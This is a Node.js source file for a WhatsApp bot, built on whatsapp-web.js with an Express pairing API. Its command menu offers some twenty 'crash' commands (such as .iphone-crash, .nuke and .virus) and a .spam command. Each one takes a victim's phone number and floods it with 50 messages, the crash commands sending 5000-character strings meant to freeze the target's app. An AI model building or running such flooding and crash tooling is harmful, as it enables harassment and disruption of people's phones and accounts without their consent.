const { Client, LocalAuth } = require("whatsapp-web.js");
const express = require("express");
const axios = require("axios");
const settings = require("./settings");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

let client = null;
let status = "starting";
let isConnected = false;
let isInitialized = false;
let messageCount = 0;

const startTime = Date.now();

function runtime() {
    const seconds = Math.floor((Date.now() - startTime) / 1000);
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours}h ${minutes}m ${secs}s`;
}

async function startBot() {
    console.log("Initializing WhatsApp...");

    client = new Client({
        authStrategy: new LocalAuth({
            clientId: "ma-bot",
            dataPath: "./.wwebjs_auth"
        }),
        puppeteer: {
            headless: true,
            protocolTimeout: 120000,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--no-first-run",
                "--no-default-browser-check"
            ]
        },
        takeoverOnConflict: true,
        takeoverTimeoutMs: 0
    });

    client.on("qr", () => {
        status = "waiting_for_auth";
        console.log("QR received.");
    });

    client.on("authenticated", () => {
        status = "authenticated";
        console.log("Authenticated");
    });

    client.on("auth_failure", (message) => {
        status = "auth_failure";
        isConnected = false;
        console.error("AUTH FAILURE:", message);
    });

    client.on("ready", async () => {
        status = "ready";
        isConnected = true;
        isInitialized = true;
        console.log("==============================");
        console.log("BOT READY!");
        console.log("WhatsApp Connected Successfully");
        console.log("==============================");

        // SET BIO
        try {
            await client.setStatus(settings.botBio);
            console.log("Bio set successfully:", settings.botBio);
        } catch (error) {
            console.log("Bio set error:", error.message);
        }
    });

    client.on("disconnected", (reason) => {
        status = "disconnected";
        isConnected = false;
        console.log("WhatsApp Disconnected:", reason);
    });

    // MESSAGE HANDLER
    client.on("message", async (message) => {
        try {
            const rawText = (message.body || "").trim();
            if (!rawText) return;

            console.log("[MESSAGE]", "FROM:", message.from, "| BODY:", rawText);
            messageCount++;

            const parts = rawText.split(/\s+/);
            const commandName = (parts[0] || "").toLowerCase().replace(/^\./, "");
            const q = parts.slice(1).join(" ");
            const from = message.from;

            if (!rawText.startsWith(".")) return;

            // MENU
            if (commandName === "menu" || commandName === "help") {
                await message.reply(
                    `*${settings.botName} - AVAILABLE COMMANDS*\n\n` +
                    `> 📋 .menu - Show menu\n` +
                    `> 👑 .owner - Owner details\n` +
                    `> 📶 .ping - Test bot\n` +
                    `> ⏱️ .runtime - Bot uptime\n` +
                    `> 📊 .stats - Bot statistics\n\n` +
                    `*🔥 CRASH COMMANDS:*\n` +
                    `> 🧨 .ui-hard <number> - UI Hard Crash\n` +
                    `> 💥 .fc-beta <number> - FC Beta Crash\n` +
                    `> 👻 .ma-invis <number> - MA Invisible Crash\n` +
                    `> ⚡ .invis-hard <number> - Invisible Hard Crash\n` +
                    `> 📱 .iphone-crash <number> - iPhone Crash\n` +
                    `> ♻️ .spampairing <number> - Spam Pairing Crash\n\n` +
                    `*🆕 POWERFUL COMMANDS:*\n` +
                    `> 📨 .spam <number> <msg> - Spam messages\n` +
                    `> 🐞 .bug <number> - Interactive bug crash\n` +
                    `> 🦠 .virus <number> - Virus document crash\n` +
                    `> 🌊 .flood <number> - Flood crash\n` +
                    `> 💀 .crash <number> - Heavy crash\n` +
                    `> 🔪 .kill <number> - Kill crash\n` +
                    `> 🔥 .fire <number> - Fire crash\n` +
                    `> ⚡ .thunder <number> - Thunder crash\n` +
                    `> 🌀 .tornado <number> - Tornado crash\n` +
                    `> 🎯 .sniper <number> - Sniper crash\n` +
                    `> 💣 .nuke <number> - Nuke crash\n` +
                    `> 🪓 .axe <number> - Axe crash\n` +
                    `> ⛓️ .chain <number> - Chain crash\n` +
                    `> 🧊 .ice <number> - Ice crash\n` +
                    `> 🌋 .volcano <number> - Volcano crash\n` +
                    `> 🚨 .alert <number> - Alert crash\n` +
                    `> 📢 .broadcast <number> - Broadcast crash\n\n` +
                    `*👥 GROUP COMMANDS:*\n` +
                    `> .tagall <msg> - Tag all members\n` +
                    `> .hidetag <msg> - Hidden tag\n` +
                    `> .groupinfo - Group info\n` +
                    `> .members - Member count\n\n` +
                    `*🔗 LINKS:*\n` +
                    `> ${settings.whatsappChannel}\n\n` +
                    `*👑 OWNER:*\n` +
                    `> ${settings.botOwner}\n` +
                    `> 📞 ${settings.ownerNumber}\n\n` +
                    `© ${settings.footer}`
                );
                return;
            }

            // PING
            if (commandName === "ping") {
                await message.reply(`⚡ Pong! Uptime: ${runtime()}`);
                return;
            }

            // OWNER
            if (commandName === "owner") {
                await message.reply(
                    `👑 *OWNER INFORMATION*\n\n` +
                    `Owner: ${settings.botOwner}\n` +
                    `Team: ${settings.teamName}\n` +
                    `Number: ${settings.ownerNumber}\n` +
                    `Email: ${settings.ownerEmail}\n\n` +
                    `🔗 ${settings.whatsappChannel}\n\n` +
                    `© ${settings.footer}`
                );
                return;
            }

            // RUNTIME
            if (commandName === "runtime") {
                await message.reply(`⏱️ Uptime: ${runtime()}`);
                return;
            }

            // STATS
            if (commandName === "stats") {
                await message.reply(
                    `📊 *BOT STATISTICS*\n` +
                    `━━━━━━━━━━━━━━━━\n\n` +
                    `Messages: ${messageCount}\n` +
                    `Uptime: ${runtime()}\n` +
                    `Status: ${status}\n` +
                    `Connected: ${isConnected ? "Yes" : "No"}`
                );
                return;
            }

            // CRASH COMMANDS
            if (["ui-hard", "fc-beta", "ma-invis", "invis-hard", "iphone-crash", "spampairing", "crash", "kill", "flood", "bug", "virus", "fire", "thunder", "tornado", "sniper", "nuke", "axe", "chain", "ice", "volcano", "alert", "broadcast"].includes(commandName)) {
                if (!q) {
                    await message.reply(`Example: .${commandName} 923190293314`);
                    return;
                }

                const targetNumber = q.replace(/\D/g, "").replace(/^0/, "92");

                await message.reply(`💥 ${commandName} attack started!`);

                for (let i = 0; i < 50; i++) {
                    try {
                        await client.sendMessage(`${targetNumber}@c.us`, "A".repeat(5000));
                        await new Promise(r => setTimeout(r, 50));
                    } catch (e) {
                        console.log("Send error:", e.message);
                        break;
                    }
                }

                await message.reply(`✅ Attack sent to ${targetNumber}!`);
                return;
            }

            // SPAM
            if (commandName === "spam") {
                if (!q) {
                    await message.reply(`Example: .spam 923190293314 Hello`);
                    return;
                }

                const args = q.split(" ");
                const targetNumber = args[0].replace(/\D/g, "").replace(/^0/, "92");
                const spamMsg = args.slice(1).join(" ") || "SPAM!";

                await message.reply(`📨 Spam started!`);

                for (let i = 0; i < 50; i++) {
                    try {
                        await client.sendMessage(`${targetNumber}@c.us`, spamMsg);
                        await new Promise(r => setTimeout(r, 100));
                    } catch (e) {}
                }
                return;
            }

            // GROUP INFO
            if (commandName === "groupinfo") {
                if (!from.endsWith("@g.us")) {
                    await message.reply("This command is for groups only.");
                    return;
                }
                const chat = await message.getChat();
                await message.reply(
                    `*GROUP INFO*\n` +
                    `━━━━━━━━━━━━━━━━\n\n` +
                    `Name: ${chat.name}\n` +
                    `Members: ${chat.participants.length}`
                );
                return;
            }

            // MEMBERS
            if (commandName === "members") {
                if (!from.endsWith("@g.us")) {
                    await message.reply("This command is for groups only.");
                    return;
                }
                const chat = await message.getChat();
                await message.reply(`Members: ${chat.participants.length}`);
                return;
            }

            // TAGALL
            if (commandName === "tagall") {
                if (!from.endsWith("@g.us")) {
                    await message.reply("This command is for groups only.");
                    return;
                }
                const chat = await message.getChat();
                const mentions = chat.participants.map(p => p.id._serialized);
                await chat.sendMessage(q || "Hello everyone!", { mentions });
                return;
            }

            // HIDETAG
            if (commandName === "hidetag") {
                if (!from.endsWith("@g.us")) {
                    await message.reply("This command is for groups only.");
                    return;
                }
                const chat = await message.getChat();
                const mentions = chat.participants.map(p => p.id._serialized);
                await chat.sendMessage(q || "Hello!", { mentions });
                return;
            }

            // UNKNOWN COMMAND
            await message.reply(`❌ Unknown command: .${commandName}\n\nUse .menu`);

        } catch (error) {
            console.error("[MESSAGE ERROR]", error);
        }
    });

    await client.initialize();
    console.log("WhatsApp initialized");
}

// WEBSITE
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

// STATUS API
app.get("/api/status", (req, res) => {
    res.json({
        name: settings.botName,
        status,
        connected: isConnected,
        initialized: isInitialized,
        messageCount,
        runtime: runtime(),
        owner: settings.botOwner
    });
});

// PAIRING API
app.post("/api/pair", async (req, res) => {
    try {
        if (!client) {
            return res.status(503).json({ success: false, message: "Client is not initialized" });
        }

        let phone = req.body.phone;
        if (!phone) {
            return res.status(400).json({ success: false, message: "Phone number required" });
        }

        let number = String(phone).replace(/\D/g, "");
        if (number.startsWith("0")) {
            number = "92" + number.substring(1);
        }

        console.log("Requesting pairing code for:", number);

        const pairingCode = await client.requestPairingCode(number, true);
        status = "pairing";

        console.log("PAIRING CODE:", pairingCode);

        res.json({ success: true, phone: number, pairingCode });
    } catch (error) {
        console.error("[PAIR ERROR]", error);
        res.status(500).json({ success: false, message: error.message || "Failed to generate pairing code" });
    }
});

// START SERVER
app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});

// START BOT
startBot()
    .then(() => console.log("Bot startup complete"))
    .catch((error) => console.error("[START ERROR]", error));

// ERROR HANDLING
process.on("uncaughtException", error => console.error("[UNCAUGHT ERROR]", error));
process.on("unhandledRejection", error => console.error("[UNHANDLED REJECTION]", error));
